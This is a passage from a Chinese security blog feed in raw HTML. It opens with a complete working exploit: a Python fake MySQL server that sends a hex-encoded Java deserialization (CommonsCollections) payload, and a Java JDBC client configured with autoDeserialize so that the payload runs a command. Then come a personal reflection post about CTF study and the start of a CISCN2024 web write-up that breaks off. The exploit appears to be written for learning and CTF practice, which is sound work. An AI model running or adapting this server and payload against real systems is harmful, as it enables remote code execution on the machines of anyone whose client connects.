-*-</span><span class="token comment">#@Time : 2020/7/27 2:10</span><span class="token comment">#@Author: Tri0mphe7</span><span class="token comment">#@File : server.py</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> binascii<span class="token keyword">import</span> osgreeting_data <span class="token operator">=</span> <span class="token string">"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"</span>response_ok_data <span class="token operator">=</span> <span class="token string">"0700000200000002000000"</span><span class="token keyword">def</span> <span class="token function">receive_data</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Receiveing the package : &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">send_data</span><span class="token punctuation">(</span>conn<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Sending the package : &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_payload_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  "calc" > a</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">r'a'</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            payload_content <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"open successs"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"open false"</span><span class="token punctuation">)</span>        <span class="token comment">#calc</span>        payload_content <span class="token operator">=</span> <span class="token string">'aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'</span>    <span class="token keyword">return</span> payload_content<span class="token comment"># 主要逻辑</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> sk<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Connection come from &#123;&#125;:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> addr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># 1.先发送第一个 问候报文</span>        send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> greeting_data<span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span>            receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> response_ok_data<span class="token punctuation">)</span>            <span class="token comment">#其他过程</span>            data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            <span class="token comment">#查询一些配置信息,其中会发送自己的 版本号</span>            <span class="token keyword">if</span> <span class="token string">"session.auto_increment_increment"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                _payload <span class="token operator">=</span> <span class="token string">'01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'</span>                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> _payload<span class="token punctuation">)</span>                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            <span class="token keyword">elif</span> <span class="token string">"show warnings"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                _payload <span class="token operator">=</span> <span class="token string">'01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'</span>                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> _payload<span class="token punctuation">)</span>                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"set names"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> response_ok_data<span class="token punctuation">)</span>                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"set character_set_results"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> response_ok_data<span class="token punctuation">)</span>                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"show session status"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                mysql_data <span class="token operator">=</span> <span class="token string">'0100000102'</span>                mysql_data <span class="token operator">+=</span> <span class="token string">'1a000002036465660001630163016301630c3f00ffff0000fc9000000000'</span>                mysql_data <span class="token operator">+=</span> <span class="token string">'1a000003036465660001630163016301630c3f00ffff0000fc9000000000'</span>                <span class="token comment"># 获取payload</span>                payload_content <span class="token operator">=</span> get_payload_content<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># 计算payload长度</span>                payload_length <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload_content<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>                    <span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                payload_length_hex <span class="token operator">=</span> payload_length<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> payload_length<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>                <span class="token comment"># 计算数据包长度</span>                data_len <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload_content<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>                    <span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>                data_len_hex <span class="token operator">=</span> data_len<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> data_len<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> data_len<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>                mysql_data <span class="token operator">+=</span> data_len_hex <span class="token operator">+</span> <span class="token string">'04'</span> <span class="token operator">+</span> <span class="token string">'fbfc'</span> <span class="token operator">+</span> payload_length_hex                mysql_data <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>payload_content<span class="token punctuation">)</span>                mysql_data <span class="token operator">+=</span> <span class="token string">'07000005fe000022000100'</span>                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> mysql_data<span class="token punctuation">)</span>                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"show warnings"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>                payload <span class="token operator">=</span> <span class="token string">'01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'</span>                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    HOST <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span>    PORT <span class="token operator">=</span> <span class="token number">3309</span>    sk <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    <span class="token comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span>    sk<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    sk<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>    sk<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start fake mysql server listening on &#123;&#125;:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>    run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>客户端（mysql-connector-java-8.0.12）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> driver <span class="token operator">=</span> <span class="token string">"com.mysql.cj.jdbc.Driver"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> <span class="token constant">DB_URL</span> <span class="token operator">=</span> <span class="token string">"jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true"</span><span class="token punctuation">;</span> <span class="token comment">//8.x使用</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Connection</span> conn <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token constant">DB_URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;我从来都不觉得学java开心过x&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/03/11/WebDog%E5%BF%85%E5%AD%A6%E7%9A%84JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&quot;&gt;https://boogipop.com/2023/03/11/WebDog%E5%BF%85%E5%AD%A6%E7%9A%84JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/10/01/JDBC-Attack%20%E5%88%A9%E7%94%A8%E6%B1%87%E6%80%BB/&quot;&gt;https://boogipop.com/2023/10/01/JDBC-Attack%20%E5%88%A9%E7%94%A8%E6%B1%87%E6%80%BB/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://tttang.com/archive/1877/&quot;&gt;https://tttang.com/archive/1877/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/8159&quot;&gt;https://xz.aliyun.com/t/8159&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/GeekerJun/p/17859798.html&quot;&gt;https://www.cnblogs.com/GeekerJun/p/17859798.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Bad Ending?</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/05/19/Bad-Ending/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/05/19/Bad-Ending/</id>
    <published>2024-05-19T12:34:56.000Z</published>
    <updated>2024-05-29T17:19:20.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原本写了很多很多，但是想了想没必要，于是又删掉不少</p><p>虽然大二还没结束，但是接下来的日子也是一眼望到头了，所以可以当作学年总结？</p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><blockquote><p>在与java的搏斗中死去了…</p></blockquote><p>在你面前的是：</p><ul><li>java苦手，一年无突破性增长</li><li>实力低于同届绝大多数web手，差距还在增大</li><li>比赛必零解，复现冲ak，<del>现在到达战场的是诸葛亮最强形态——事后诸葛亮</del></li><li>投入 &gt;&gt; 产出的fw web狗！</li></ul><p>上次阶段总结的时候提过，这个学期把java安全拿下，至少别再无从下手了</p><p>预期是这学期要学到各种java内存马的，实际上因为各种事情只学了三条cc链，能做的题只有去年国赛的 DeserBug 和 XYCTF 的那道java<br>而这个学期如今只剩下了一个月多一点的时间，重心得转移到预习期末考和六级上面，不怎么想留级，也不想重来<br>于是这学期的java安全学习基本上可以宣告再次失败了</p><p>对照一下Boogipop神的进度，依旧没能跨过他23年3月份学的东西，差距是越来越大了。。。但是没有时间能投入学习</p><p>和校队里其它方向的师傅相比，他们花的时间比我少不少，但是一直在进步变强，而我常常因为太菜而和您们格格不入x</p><p>联合战队？总不能再学一年web大三再进吧，这下算是寄了<br>不过，曾经有两次机会能让我接触到联合战队，但我没能把握住，连聊天与面试的机会也没能得到。。</p><p><del>“我从来都不觉得打web开心过”</del></p><hr><h1 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h1><blockquote><p>你打ctf快两年了，当赛棍打过这么多比赛，一定很厉害吧？</p></blockquote><ul><li>一刻也没有为上一个比赛的爆零哀悼，立刻赶到战场的是——复现！</li><li>一刻也没有为比赛复现不完哀悼，立刻赶到战场的是——下一个比赛！</li></ul><p>入坑以来DASCTF、NSS Round web场场报名，但是除非是特别简单的签到题，否则永远是0解，永远只有赛后复现的份；唯一的变化是赛后看了wp，反应从原来的 “看不懂不会复现” 变成了 “哦这题原来是这样入手的啊”</p><p>最近看了下西电校赛Mini-L CTF 2024，忘了打，就看了下别的师傅的复现<br>7道web题里面有3道java，呃，不会打shiro，没学也不会打mybatis，fastjson更是完全没去看<br>然后看了下排行榜，比同一届的师傅菜得多已经是既定事实了，然后23级的师傅也能够杀穿web当 java master了，唉后生可畏</p><p>今天也是刚刚结束了CISCN的初赛，评价是哈人，一部分是因为web约等于爆0了，好几题有思路但是不知道怎么做或者问题出在哪里了😭；另一部分是惊叹于黑灯1200+的提交次数😰</p><p>是的孩子们，ctf的未来靠你们了.jpg</p><p><del>唉不是怎么没人能教教我web啊，原来是我几乎没有认识的师傅啊</del></p><p>之前听一位技术员说过，网安靠的更多是圈子和人脉，现在看来确实。缺少人脉，不混圈子又能单打独斗到什么时候呢？</p><hr><h1 id="协会"><a href="#协会" class="headerlink" title="协会"></a>协会</h1><p>想要为协会建设一点什么东西，可是自己的事情又做不好</p><p>缺人缺钱缺时间缺精力，很多计划最后都没下文了</p><p>很难想象巨魔卸任之后的协会会怎样。。</p><hr><h1 id="生活-amp-学业"><a href="#生活-amp-学业" class="headerlink" title="生活&amp;学业"></a>生活&amp;学业</h1><p>自打蓝帽杯结束之后就是长期的两点睡早八起作息，肝疼（</p><p>现在的生活已经是日趋单调了，五一假期也是在宿舍待了五天，每天基本就是起床吃早饭，游戏清个体力，看ctf题，午睡完起来看会题，然后去乐跑，晚上打会游戏，看会期中考的内容，于是就到睡觉了。。。</p><p>steam库里面堆了一堆大促买的游戏，<del>galgame也没时间去好好玩了</del></p><p>重修的高数和概率论在期中考之后就因为各种原因没时间学，马上又要到期末考了，高数期中考得依托，接下来是越来越没时间了</p><p>专业课不知道考什么，也不是特别愿意背八股文。。。</p><hr><h1 id="结束了？"><a href="#结束了？" class="headerlink" title="结束了？"></a>结束了？</h1><p>接下来学一下代审，再学点hw需要的东西，然后呢？我不知道，web的强度膨胀越来越高了，我实在是不知道要不要继续下去，再走下去也只是徒增焦虑，而且web渗透红蓝队本就非我所愿，坚持在web上只是因为“被需要着”吧？</p><p>或许真正想学的是逆向？不过这意味着一切从0开始，承认过去两年的努力打水漂，而且，缺少他人的指引，会不会又走上大量的弯路？</p><p>又或者在剩下的时间像一个普通的大学生一样去好好学习，想玩就玩想学就学想睡就睡，然后投身考研大军，但这样真的能实现自己的目标吗？</p><p>不过，我果然还是无法想象停止学习技术的自己会是什么样子的，正是因为对技术的追求才有了现在的我吧</p><p>“明知自己根本做不到放弃。 那时…我终于注意到了。我——没有办法逃走。”</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;原本写了很多很多，但是想了想没必要，于是又删掉不少&lt;/p&gt;
&lt;p&gt;虽然大二还没结束，但是接下来的日子也是一眼望到头了，所以可以当作学年总结？&lt;/p&gt;</summary>
    
    
    
    <category term="Thinking" scheme="http://c1oudfl0w0.github.io/blog/categories/Thinking/"/>
    
    
  </entry>
  
  <entry>
    <title>CISCN2024</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/05/18/CISCN2024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/05/18/CISCN2024/</id>
    <published>2024-05-18T01:52:50.000Z</published>
    <updated>2024-06-03T04:57:08.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>唉唉，某种意义上web爆0了，<del>“你们怎么不做web啊，是不想做吗”</del></p><p>simple_php是队友点出来的，cms是头天晚上突然审明白才会的</p><p>两道python是有大概思路但是不会做的</p><p>jdbc是没学的。。。</p><p>参考：</p><p><a href="https://blog.csdn.net/Jayjay___/article/details/139047540">https://blog.csdn.net/Jayjay___/article/details/139047540</a></p><p><a href="https://jbnrz.com.cn/index.php/2024/05/20/ciscn-2024/">https://jbnrz.com.cn/index.php/2024/05/20/ciscn-2024/</a></p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p><p><a href="https://boogipop.com/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/">https://boogipop.com/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/</a></p><p><a href="https://www.jackacc.com/uncategorized/ciscn-2024-web-writeups/">https://www.jackacc.com/uncategorized/ciscn-2024-web-writeups/</a></p><p><a href="http://124.221.19.214/archives/681/#cl-3">http://124.221.19.214/archives/681/#cl-3</a></p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span 